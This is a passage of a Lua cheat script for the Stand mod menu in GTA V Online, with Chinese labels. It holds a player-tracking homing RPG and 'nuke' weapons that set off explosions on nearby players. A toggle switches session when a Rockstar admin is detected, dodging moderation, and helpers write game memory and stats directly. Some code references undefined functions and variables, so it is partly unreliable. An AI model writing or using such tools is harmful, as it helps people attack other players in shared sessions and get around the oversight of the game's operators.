                                        local backoffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(msl, 10, 10, -2)
                                        CAM.SET_CAM_COORD(Missile_Camera, backoffset.x, backoffset.y, backoffset.z)
                                        if lookCountD < 1 then
                                            CAM.SET_CAM_ROT(Missile_Camera, look4.x, look4.y, look4.z, 2)
                                            lookCountD = lookCountD + 1
                                        end
                                    else
                                        local camcoordv3 = CAM.GET_CAM_COORD(Missile_Camera)
                                        local look3 = v3.lookAt(camcoordv3, lc2)
                                        local look4 = GetTableFromV3Instance(look3)
                                        CAM.SET_CAM_ROT(Missile_Camera, look4.x, look4.y, look4.z, 2)
                                    end
                                end
                                ENTITY.SET_ENTITY_ROTATION(msl, look.x, look.y, look.z, 2, true)
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, dir.x * missile_settings.speed * distx, dir.y * missile_settings.speed * disty, dir.z * missile_settings.speed * distz, true, false, true, true)
                                util.yield()
                            else
                                ENTITY.SET_ENTITY_ROTATION(msl, look.x, look.y, look.z, 2, true)
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, dir.x * missile_settings.speed, dir.y * missile_settings.speed, dir.z * missile_settings.speed, true, false, true, true)
                                util.yield()
                            end
                        end
                        if missile_settings.cam then
                            util.yield(2000)
                            if SE_Notifications then
                                util.toast("相机删除")
                            end
                            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
                            if CAM.IS_CAM_ACTIVE(Missile_Camera) then
                                CAM.SET_CAM_ACTIVE(Missile_Camera, false)
                            end
                            CAM.DESTROY_CAM(Missile_Camera, true)
                        end
                    end
                    if missile_settings.multitarget then
                        table.remove(MISSILE_ENTITY_TABLE, GetValueIndexFromTable(MISSILE_ENTITY_TABLE, plocalized))
                        util.toast("已删除的值" .. tostring(plocalized) .. " at index " .. tostring(GetValueIndexFromTable(MISSILE_ENTITY_TABLE, p)))
                    end
                end)
            end
            util.yield()
        end
    end
end
menu.toggle(weapons, "RPG自动瞄准器", {}, "发射后自动追踪视野内玩家", function (on)
    RPG_Automatic_sight(on)
end)
------天基炮
function get_offset_from_gameplay_camera(distance)
	local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
	local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
	local direction = v3.toDir(cam_rot)
	local destination = {
	  x = cam_pos.x + direction.x * distance,
	  y = cam_pos.y + direction.y * distance,
	  z = cam_pos.z + direction.z * distance
	}
	return destination
end
function use_fx_asset(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
		STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
		util.yield(0)
	end
    GRAPHICS.USE_PARTICLE_FX_ASSET(asset)
end
function nuclear_weapon1()
    local last_hit_coords = v3.new()
	if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), last_hit_coords) then
        use_fx_asset("scr_xm_orbital")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_xm_orbital")
        FIRE.ADD_EXPLOSION(last_hit_coords.x, last_hit_coords.y, last_hit_coords.z, 59, 1, true, false, 1.0, false)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", last_hit_coords.x, last_hit_coords.y, last_hit_coords.z, 0, 180, 0, 1.0, true, true, true)
        for i = 1, 4 do
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "DLC_XM_Explosions_Orbital_Cannon", players.user_ped(), 0, true, false)
        end
	end
end
-----核弹
function get_distance_between(pos1, pos2)
	if math.type(pos1) == "integer" then
		pos1 = ENTITY.GET_ENTITY_COORDS(pos1)
	end
	if math.type(pos2) == "integer" then 
		pos2 = ENTITY.GET_ENTITY_COORDS(pos2)
	end
	return pos1:distance(pos2)
end
function nuke_expl1(Position)
    local offsets = {
        {10, 0, 0}, {0, 10, 0}, {10, 10, 0}, {-10, 0, 0}, {0, -10, 0}, {-10, -10, 0}, {10, -10, 0}, {-10, 10, 0},
        {20, 0, 0}, {0, 20, 0}, {20, 20, 0}, {-20, 0, 0}, {0, -20, 0}, {-20, -20, 0}, {20, -20, 0}, {-20, 10, 0},
        {30, 0, 0}, {0, 30, 0}, {30, 30, 0}, {-30, 0, 0}, {0, -30, 0}, {-30, -30, 0}, {30, -30, 0}, {-30, 10, 0},
        {10, 30, 0}, {30, 10, 0}, {-30, -10, 0}, {-10, -30, 0}, {-10, 30, 0}, {-30, 10, 0}, {30, -10, 0}, {10, -30, 0},
        {0, 0, 10}, {0, 0, -10}, {0, 0, 20}, {0, 0, -20}
    }
    for _, offset in ipairs(offsets) do
        FIRE.ADD_EXPLOSION(Position.x + offset[1], Position.y + offset[2], Position.z + offset[3], 59, 1.0, true, false, 1.0, false)
    end
end
function nuke_expl2(Position)
    local offsets = {{0,0,-10}, {10,0,-10}, {0,10,-10}, {10,10,-10}, {-10,0,-10}, {0,-10,-10}, {-10,-10,-10}, {10,-10,-10}, {-10,10,-10}}
    for _, offset in ipairs(offsets) do
        FIRE.ADD_EXPLOSION(Position.x + offset[1], Position.y + offset[2], Position.z + offset[3], 59, 1.0, true, false, 1.0, false)
    end
end
function nuke_expl3(Position)
    local offsets = {{10,0,0}, {0,10,0}, {10,10,0}, {-10,0,0}, {0,-10,0}, {-10,-10,0}, {10,-10,0}, {-10,10,0}, {0,0,0}}
    for _, offset in ipairs(offsets) do
        FIRE.ADD_EXPLOSION(Position.x + offset[1], Position.y + offset[2], Position.z + offset[3], 59, 1.0, true, false, 1.0, false)
    end
end
function create_nuke_explosion(Position)
    for count = 1, 17 do
        if count == 1 then
	        FIRE.ADD_EXPLOSION(Position.x, Position.y, Position.z, 59, 1, true, false, 5.0, false)
        elseif count == 2 then
            FIRE.ADD_EXPLOSION(Position.x, Position.y, Position.z, 59, 1, true, false, 1.0, false)
        end
		use_fx_asset("scr_xm_orbital")
	    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", Position.x, Position.y, Position.z, 0, 180, 0, 4.5, true, true, true)
    end
    nuke_expl1(Position)
	for i = 1, 4 do
		AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "DLC_XM_Explosions_Orbital_Cannon", players.user_ped(), 0, true, false)
	end
    for count = 1, 2 do
        if count == 1 then
	        FIRE.ADD_EXPLOSION(Position.x, Position.y, Position.z-10, 59, 1, true, false, 5.0, false)
        end
		use_fx_asset("scr_xm_orbital")
	    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", Position.x, Position.y, Position.z-10, 0, 180, 0, 4.5, true, true, true)
    end
    nuke_expl2(Position)
    local size = 1.5
    local positionsZ = {1, 3, 5, 7, 10, 12, 15, 17, 20, 22, 25, 27, 30, 32, 35, 37, 40, 42, 45, 47, 50, 52, 55, 57, 59, 61, 63, 65, 70, 75, 75, 75, 75, 80, 80}
    for i, pos in ipairs(positionsZ) do
        if i == 3 or i == 5 or i == 7 or i == 9 or i == 11 or i == 13 or i == 15 or i == 17 or i == 19 or i == 21 or i == 23 or i == 25 or i == 29 or i == 30 then
        FIRE.ADD_EXPLOSION(Position.x, Position.y, Position.z+pos, 59, 1.0, true, false, 1.0, false)
        end
        use_fx_asset("scr_xm_orbital")
	    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", Position.x, Position.y, Position.z+pos, 0, 180, 0, size, true, true, true)

        if i >= 30 and i <= 33 then size = 3.5
        elseif i >= 34 and i <= 35 then size = 3.0
        else size = 1.5 end
        util.yield(10)
    end
    nuke_expl3(Position)
	for _, pid in pairs(players.list(false, true, true)) do
        local distance = get_distance_between(players.get_position(pid), Position)
		if distance < 200 then
			local pid_pos = players.get_position(pid)
			FIRE.ADD_EXPLOSION(pid_pos.x, pid_pos.y, pid_pos.z, 59, 1.0, true, false, 1.0, false)
		end
	end
	local peds = entities.get_all_peds_as_handles()
	for _, ped in pairs(peds) do
		if get_distance_between(ped, Position) > 200 and get_distance_between(ped, Position) < 400 and ped ~= players.user_ped() then
			local ped_pos = ENTITY.GET_ENTITY_COORDS(ped)
			FIRE.ADD_EXPLOSION(ped_pos.x, ped_pos.y, ped_pos.z, 3, 1.0, true, true, 0.1, false)
		end
	end
	local vehicles = entities.get_all_vehicles_as_handles()
    for _, vehicle in pairs(vehicles) do
		if get_distance_between(vehicle, Position) < 400 then
			VEHICLE.EXPLODE_VEHICLE(vehicle, true, false)
		elseif get_distance_between(vehicle, Position) > 200 and get_distance_between(vehicle, Position) < 400 then
			VEHICLE.EXPLODE_VEHICLE(vehicle, true, false)
		end
	end
end
function nuclear_weapon2()
    if PED.IS_PED_SHOOTING(players.user_ped()) then
		local hash = util.joaat("prop_military_pickup_01")
		request_model(hash)
		local player_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 5.0, 3.0)
		local dir = {}
		local c2 = {}
		c2 = get_offset_from_gameplay_camera(1000)
		dir.x = (c2.x - player_pos.x) * 1000
		dir.y = (c2.y - player_pos.y) * 1000
		dir.z = (c2.z - player_pos.z) * 1000
		local nuke = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, player_pos.x, player_pos.y, player_pos.z, true, false, false)
		ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(nuke, players.user_ped(), false)
		ENTITY.APPLY_FORCE_TO_ENTITY(nuke, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
		ENTITY.SET_ENTITY_HAS_GRAVITY(nuke, true)
		while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(nuke) and not ENTITY.IS_ENTITY_IN_WATER(nuke) do
			util.yield(0)
		end
		local nukePos = ENTITY.GET_ENTITY_COORDS(nuke, true)
		entities.delete_by_handle(nuke)
        create_nuke_explosion(nukePos)
	end
end
-------核弹枪
function toDirection(rotation) 
	local adjusted_rotation = { 
		x = (math.pi / 180) * rotation.x, 
		y = (math.pi / 180) * rotation.y, 
		z = (math.pi / 180) * rotation.z 
	}
	local direction = {
		x = - math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		y =   math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		z =   math.sin(adjusted_rotation.x)
	}
	return direction
end
function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = toDirection(CAM.GET_GAMEPLAY_CAM_ROT(0))
    local destination =
    {
        x = cam_pos.x + direction.x * distance,
        y = cam_pos.y + direction.y * distance,
        z = cam_pos.z + direction.z * distance
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x,
            cam_pos.y,
            cam_pos.z,
            destination.x,
            destination.y,
            destination.z,
            flag,
            -1,
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end
function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2
    if res[1] != 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end
    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end
function disableProjectileLoop(projectile)
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
end
mutually_exclusive_weapons  = {}
function nukegunmode()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1312131151 then --if holding homing launcher
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                disableProjectileLoop(-1312131151)
                
                util.create_thread(function()
                    local hash = util.joaat('w_arena_airmissile_01a')
                    loadModel(hash)

                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()

                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        util.yield()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            end
        end
end


nuclear_weapon = menu.list(weapons, "核武器", {}, "")
    menu.toggle_loop(nuclear_weapon,"天基炮", {}, "", function()
        nuclear_weapon1()
    end)
    menu.toggle_loop(nuclear_weapon,"核弹", {}, "", function()
        nuclear_weapon2()
    end)
    menu.toggle_loop(nuclear_weapon, '核弹枪', {}, "使火箭炮发出的子弹变成核弹", function()
        nukegunmode()
    end)
    -----推进载具
function get_entity_player_is_aiming_at(player)
	if not PLAYER.IS_PLAYER_FREE_AIMING(player) then
		return 0
	end
	local entity = false
    local aimed_entity = memory.alloc_int()
	if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(player, aimed_entity) then
		entity = memory.read_int(aimed_entity)
	end
	if entity ~= false and ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity, false) then
		entity = PED.GET_VEHICLE_PED_IS_IN(entity, false)
	end
	return entity
end

    menu.toggle_loop(weapons,"推进载具", {}, "", function()
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            local entity = get_entity_player_is_aiming_at(players.user())
            if entity ~= 0 then
                if ENTITY.IS_ENTITY_A_VEHICLE(entity) then
                    VEHICLE.SET_VEHICLE_FORWARD_SPEED(entity, 100)
                end
            end
        end
    end)

--------------------------------------------------------------------------------------------------------------------------------
--保护

menu.action(protects, "强制停止所有声音", {"stopsounds"}, "", function()
    for i=-1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

menu.action(protects, "删除手机铃声", {}, "删除手机铃声，让手机不再响铃", function()
    local player = PLAYER.PLAYER_PED_ID()
    menu.trigger_commands("nophonespam on")
    if AUDIO.IS_PED_RINGTONE_PLAYING(player) then
        for i = -1, 100 do
            AUDIO.STOP_PED_RINGTONE(i)
            AUDIO.RELEASE_SOUND_ID(i)
        end

    end
    util.yield(1000)
    menu.trigger_commands("nophonespam off")
end)
menu.action(protects, "超级清", {""}, "", function()
    local ct = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)

        ct = ct + 1
    end

    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)

        end
        ct = ct + 1
    end

end)

menu.action(protects, "删除附加", {}, "", function()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)

local quitarf = menu.list(protects, "阻止冻结")

menu.action(quitarf, "阻止冻结V1", {}, "尝试重新启动一些东西以删除冻结状态", function()
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    MISC.OVERRIDE_FREEZE_FLAGS()
    menu.trigger_commands("rcleararea")
end)

menu.action(quitarf, "阻止冻结V2 （测试阶段）", {}, "尝试重新启动一些东西来删除冻结状态，用这种方法会自杀.", function()
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    ENTITY.SET_ENTITY_COORDS(player, 1, 0, 0, 1, false)
    MISC.OVERRIDE_FREEZE_FLAGS()
    menu.trigger_commands("rcleararea")
end)

menu.toggle(protects, "恐慌模式", {"panic"}, "这将呈现出一种反崩溃模式，不惜一切代价从游戏中移除各种事件。", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

menu.toggle(protects, "崩溃保护", {}, "尝试阻止崩溃.", function(on_toggle)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    local ped = PLAYER.GET_PLAYER_PED(players.user())
    if on_toggle then
        util.yield(300)
        ENTITY.SET_ENTITY_COORDS(ped, 25.030561, 7640.8735, 17.831139, 1, false)
        util.yield(600)
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("trafficpotato on")
        util.yield(2000)
        menu.trigger_commands("rclearworld")
    else        
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("anticrashcamera off")
        menu.trigger_commands("trafficpotato off")
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS(player, lastpos.x, lastpos.y, lastpos.z, 1, true)
        ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, false)
        util.yield(500)
        menu.trigger_commands("rclearworld")
        util.yield(1000)
        menu.trigger_commands("rcleararea")
        util.toast("Evaded Crash :b")
    end
end)



menu.toggle_loop(protects, "管理员检测", {}, "如果检测到R星管理员将自动切换战局", function(on)
    bailOnAdminJoin = on
end)

if bailOnAdminJoin then
    if players.is_marked_as_admin(player_id) then
        util.toast(players.get_name(player_id) .. " 如果有管理员，切换到另一个战局.")
        menu.trigger_commands("quickbail")
        return
    end
end

menu.toggle_loop(protects, "阻止事件崩溃 （测试阶段）", {}, "有可能导致错误，使用不负责任", function(on_toggle)
    local TransactionError = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Block")
    local TransactionErrorV = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Notification")
    if on_toggle then
        menu.trigger_command(TransactionError, "on")
        menu.trigger_command(TransactionErrorV, "on")
        for i = 1, 300 do
            menu.trigger_commands("removeloader")
            util.yield(1000)
        end
    end
end)

menu.toggle_loop(protects, "阻止颗粒物", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

menu.toggle_loop(protects, "阻止变成野兽", {}, "阻止他们用Stand把你变成野兽", function()
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            util.yield()
        until host ~= -1
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
    end
end)

local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local anticage = menu.list(protects, "笼子保护", {}, "")
local alpha = 160
menu.slider(anticage, "笼子Alpha", {"cagealpha"}, "笼子的透明度。如果它在0，你将看不到它", 0, #values, 3, 1, function(amount)
    alpha = values[amount]
end)

menu.toggle_loop(anticage, "阻止笼子", {"anticage"}, "", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
            continue
        end
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
                util.toast("他们试图给你套笼子")
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
                ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
            end
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
                entities.delete_by_handle(obj_handle)
            end
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)


local anti_mugger = menu.list(protects, "阻止抢劫犯")

menu.toggle_loop(anti_mugger, "阻止针对自己的抢劫犯", {}, "阻止针对你的抢劫犯", function() 
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Blocked mugger from " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)

menu.toggle_loop(anti_mugger, "阻止针对别人的抢劫犯", {}, "阻止针对别人的抢劫犯", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Block mugger sent by " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end)


local pool_limiter = menu.list(protects, "池选项", {}, "")
local ped_limit = 175
menu.slider(pool_limiter, "Ped池", {"pedlimit"}, "", 0, 256, 175, 1, function(amount)
    ped_limit = amount
end)

local veh_limit = 200
menu.slider(pool_limiter, "载具池", {"vehlimit"}, "", 0, 300, 150, 1, function(amount)
    veh_limit = amount
end)

local obj_limit = 750
menu.slider(pool_limiter, "实体池", {"objlimit"}, "", 0, 2300, 750, 1, function(amount)
    obj_limit = amount
end)



menu.toggle_loop(pool_limiter, "启用池限制修改", {}, "", function()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
        end
    end
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
        end
    end
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(obj)
            end
        end
    end
end)
--任务

function MP_INDEX()
    return "MP" .. util.get_char_slot() .. "_"
end
function IS_MPPLY(Stat)
    local Stats = {
        "MP_PLAYING_TIME",
    }

    for i = 1, #Stats do
        if Stat == Stats[i] then
            return true
        end
    end

    if string.find(Stat, "MPPLY_") then
        return true
    else
        return false
    end
end
function ADD_MP_INDEX(Stat)
    if not IS_MPPLY(Stat) then
        Stat = MP_INDEX() .. Stat
    end
    return Stat
end

function STAT_SET_INT(Stat, Value)
    STATS.STAT_SET_INT(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_FLOAT(Stat, Value)
    STATS.STAT_SET_FLOAT(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_BOOL(Stat, Value)
    STATS.STAT_SET_BOOL(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_STRING(Stat, Value)
    STATS.STAT_SET_STRING(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_DATE(Stat, Year, Month, Day, Hour, Min)
    local DatePTR = memory.alloc(7*8) 
    memory.write_int(DatePTR, Year)
    memory.write_int(DatePTR+8, Month)
    memory.write_int(DatePTR+16, Day)
    memory.write_int(DatePTR+24, Hour)
    memory.write_int(DatePTR+32, Min)
    memory.write_int(DatePTR+40, 0) 
    memory.write_int(DatePTR+48, 0) 
    STATS.STAT_SET_DATE(util.joaat(ADD_MP_INDEX(Stat)), DatePTR, 7, true)
end

function STAT_SET_PACKED_BOOL(Stat, Value)
    STATS._SET_PACKED_STAT_BOOL(Stat, Value, util.get_char_slot())
end
function STAT_SET_INCREMENT(Stat, Value)
    STATS.STAT_INCREMENT(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
end

function STAT_GET_INT(Stat)
    local IntPTR = memory.alloc_int()
    STATS.STAT_GET_INT(util.joaat(ADD_MP_INDEX(Stat)), IntPTR, -1)
    return memory.read_int(IntPTR)
end
function STAT_GET_FLOAT(Stat)
    local FloatPTR = memory.alloc_int()
    STATS.STAT_GET_FLOAT(util.joaat(ADD_MP_INDEX(Stat)), FloatPTR, -1)
    return tonumber(string.format("%.3f", memory.read_float(FloatPTR)))
end
function STAT_GET_BOOL(Stat)
    if STAT_GET_INT(Stat) == 0 then
        return "false"
    elseif STAT_GET_INT(Stat) == 1 then
        return "true"
    else
        return "STAT_UNKNOWN"
    end 
end
function STAT_GET_STRING(Stat)
    return STATS.STAT_GET_STRING(util.joaat(ADD_MP_INDEX(Stat)), -1)
end
function STAT_GET_DATE(Stat, Sort)
    local DatePTR = memory.alloc(7*8)
    STATS.STAT_GET_DATE(util.joaat(ADD_MP_INDEX(Stat)), DatePTR, 7, true)
    local Add = 0
    if Sort == "Year" then
        Add = 0
    elseif Sort == "Month" then
        Add = 8
    elseif Sort == "Day" then
        Add = 16
    elseif Sort == "Hour" then
        Add = 24
    elseif Sort == "Min" then
        Add = 32
    end
    return memory.read_int(DatePTR+Add)
end

function SET_INT_GLOBAL(Global, Value)
    memory.write_int(memory.script_global(Global), Value)
end
function SET_FLOAT_GLOBAL(Global, Value)
    memory.write_float(memory.script_global(Global), Value)
end

function GET_INT_GLOBAL(Global)
    return memory.read_int(memory.script_global(Global))
end

function SET_PACKED_INT_GLOBAL(StartGlobal, EndGlobal, Value)
    for i = StartGlobal, EndGlobal do
        SET_INT_GLOBAL(262145 + i, Value)
    end
end

function SET_INT_LOCAL(Script, Local, Value)
    if memory.script_local(Script, Local) ~= 0 then
        memory.write_int(memory.script_local(Script, Local), Value)
    end
end
function SET_FLOAT_LOCAL(Script, Local, Value)
    if memory.script_local(Script, Local) ~= 0 then
        memory.write_float(memory.script_local(Script, Local), Value)
    end
end

function GET_INT_LOCAL(Script, Local)
    if memory.script_local(Script, Local) ~= 0 then
        local Value = memory.read_int(memory.script_local(Script, Local))
        if Value ~= nil then
            return Value
        end
    end
end

function TELEPORT(X, Y, Z)
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), X, Y, Z)
end
function SET_HEADING(Heading)
    ENTITY.SET_ENTITY_HEADING(players.user_ped(), Heading)
end

function IsWorking(IsAddNewLine)
    local State = "" 
    if util.is_session_started() then
        if GET_INT_LOCAL("freemode", 3504) ~= util.joaat("lr_prop_carkey_fob") then 
            State = "[NOT WORKING]"
            if IsAddNewLine then
                State = State .. "\n\n"
            end
        end
    end
    return State
end

function RGB(R, G, B, A) 
    local Color = {}
    Color.r = R
    Color.g = G
    Color.b = B
    Color.a = A
    return Color
end

function HelpMsgBeingDisplayed(Label) 
    HUD.BEGIN_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED(Label) 
